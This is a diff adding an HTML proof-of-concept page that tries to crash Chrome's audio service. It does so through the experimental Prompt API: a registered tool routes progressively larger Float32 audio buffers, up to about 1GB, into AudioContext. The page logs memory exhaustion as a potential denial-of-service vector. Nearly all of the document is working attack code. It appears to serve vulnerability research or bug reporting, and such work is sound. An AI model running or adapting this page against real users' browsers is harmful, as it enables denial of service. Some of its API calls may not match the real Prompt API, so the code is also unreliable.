@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Audio Service Crash PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        #log { white-space: pre-wrap; font: 12px/1.4 monospace; border: 1px solid #ccc; padding: 10px; height: 400px; overflow-y: scroll; }
+        .critical { color: #dc3545; font-weight: bold; }
+        .warning { color: #fd7e14; }
+        .info { color: #0dcaf0; }
+        .success { color: #198754; }
+        button { padding: 10px 20px; margin: 5px; font-size: 16px; }
+        #progress { width: 100%; height: 20px; background: #f0f0f0; margin: 10px 0; }
+        #progress-bar { height: 100%; background: #007bff; width: 0%; transition: width 0.3s; }
+    </style>
+</head>
+<body>
+    <h2>Audio Service Stress Test PoC</h2>
+    <p><strong>Warning:</strong> This test may crash the audio service or browser</p>
+    <button onclick="testAudioServiceLimits()">Test Audio Service Limits</button>
+    <button onclick="clearLog()">Clear Log</button>
+    
+    <div id="progress">
+        <div id="progress-bar"></div>
+    </div>
+    <div id="status">Ready to test</div>
+    <div id="log"></div>
+
+    <script>
+        const log = (msg, className = '') => {
+            const logEl = document.getElementById('log');
+            const timestamp = new Date().toLocaleTimeString();
+            const line = document.createElement('div');
+            line.textContent = `[${timestamp}] ${msg}`;
+            if (className) line.className = className;
+            logEl.appendChild(line);
+            logEl.scrollTop = logEl.scrollHeight;
+        };
+
+        const clearLog = () => {
+            document.getElementById('log').innerHTML = '';
+        };
+
+        const updateProgress = (percent, status) => {
+            document.getElementById('progress-bar').style.width = percent + '%';
+            document.getElementById('status').textContent = status;
+        };
+
+        // Progressive audio buffer sizes (in Float32 elements)
+        const testSizes = [
+            1000000,      // 1M elements (~4MB)
+            5000000,      // 5M elements (~20MB)
+            25000000,     // 25M elements (~100MB)
+            50000000,     // 50M elements (~200MB)
+            100000000,    // 100M elements (~400MB)
+            250000000     // 250M elements (~1GB) - likely to cause issues
+        ];
+
+        async function testAudioServiceLimits() {
+            log('=== Audio Service Stress Test Starting ===', 'info');
+            
+            if (!window.ai?.languageModel) {
+                log('❌ Prompt API not available. Enable --enable-features=PromptApiForGeminiNano', 'critical');
+                return;
+            }
+
+            log('✓ Prompt API detected', 'info');
+            updateProgress(0, 'Initializing audio processing tool...');
+
+            try {
+                // Create tool that processes large audio buffers
+                const tools = [{
+                    name: 'process_large_audio',
+                    description: 'Processes large audio buffers through audio service',
+                    function: (audioData) => {
+                        log(`Processing audio buffer: ${audioData.length} samples (${(audioData.length * 4 / 1024 / 1024).toFixed(2)}MB)`, 'info');
+                        
+                        // Force audio service interaction
+                        try {
+                            // Create AudioContext to trigger audio service usage
+                            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                            const buffer = audioCtx.createBuffer(1, audioData.length, 44100);
+                            const channelData = buffer.getChannelData(0);
+                            
+                            // Copy data to audio buffer (this triggers audio service IPC)
+                            for (let i = 0; i < Math.min(audioData.length, channelData.length); i++) {
+                                channelData[i] = audioData[i];
+                            }
+                            
+                            // Additional audio operations that stress the service
+                            const source = audioCtx.createBufferSource();
+                            source.buffer = buffer;
+                            source.connect(audioCtx.destination);
+                            
+                            return `Processed ${audioData.length} audio samples`;
+                        } catch (e) {
+                            log(`⚠️ Audio processing failed: ${e.message}`, 'warning');
+                            throw e;
+                        }
+                    }
+                }];
+
+                const model = await window.ai.languageModel.create({ tools });
+                log('✓ AI model created with audio processing tool', 'info');
+
+                // Test progressively larger audio buffers
+                for (let i = 0; i < testSizes.length; i++) {
+                    const size = testSizes[i];
+                    const sizeMB = (size * 4 / 1024 / 1024).toFixed(2);
+                    log(`\n--- Testing audio buffer size: ${size} samples (${sizeMB}MB) ---`, 'info');
+                    try {
+                        // Create large audio buffer
+                        log(`Allocating ${sizeMB}MB Float32Array...`, 'info');
+                        const startAlloc = performance.now();
+                        const bigAudio = new Float32Array(size);
+                        // Fill with sine wave data to make it realistic
+                        for (let j = 0; j < size; j++) {
+                            bigAudio[j] = Math.sin(2 * Math.PI * 440 * j / 44100) * 0.1;
+                        }
+                        const allocTime = performance.now() - startAlloc;
+                        log(`✓ Buffer allocated in ${allocTime.toFixed(2)}ms`, 'success');
+                        // Send to Prompt API (this triggers audio service IPC)
+                        log(`Sending ${sizeMB}MB buffer to audio service...`, 'info');
+                        const startProcess = performance.now();
+                        await model.execute({
+                            tool: 'process_large_audio',
+                            audio: bigAudio
+                        });
+                        const processTime = performance.now() - startProcess;
+                        log(`✓ Buffer processed in ${processTime.toFixed(2)}ms`, 'success');
+                        // Small delay to allow audio service recovery
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    } catch (e) {
+                        log(`🚨 CRASH/ERROR at ${sizeMB}MB: ${e.message}`, 'critical');
+                        log(`Audio service likely crashed or became unstable`, 'critical');
+                        if (e.message.includes('out of memory') || e.message.includes('allocation')) {
+                            log('Memory exhaustion detected - potential DoS vector', 'critical');
+                        }
+                        updateProgress(100, `CRASHED at ${sizeMB}MB - Check chrome://crashes`);
+                        return;
+                    }
+                }
+                updateProgress(100, 'All tests completed successfully');
+                log('\n=== All Audio Buffer Tests Completed ===', 'success');
+                log('Audio service appears stable across all test sizes', 'success');
+            } catch (e) {
+                log(`🚨 FATAL ERROR: ${e.message}`, 'critical');
+                log('This likely indicates audio service instability', 'critical');
+                updateProgress(100, 'FATAL ERROR - Audio service may have crashed');
+            }
+        }
+        // Memory monitoring
+        function logMemoryUsage() {
+            if (performance.memory) {
+                const mem = performance.memory;
+                log(`Memory: ${(mem.usedJSHeapSize/1024/1024).toFixed(2)}MB used, ${(mem.totalJSHeapSize/1024/1024).toFixed(2)}MB total`, 'info');
+            }
+        }
+        // Auto-detection on load
+        window.addEventListener('load', () => {
+            if (window.ai) {
+                log('Prompt API detected. Ready to test audio service limits.');
+                logMemoryUsage();
+            } else {
+                log('Prompt API not detected. Launch Chrome with --enable-features=PromptApiForGeminiNano', 'warning');
+            }
+        });
+        // Monitor for crashes
+        window.addEventListener('beforeunload', () => {
+            console.log('Page unloading - potential audio service crash detected');
+        });
+    </script>
+</body>
+</html>
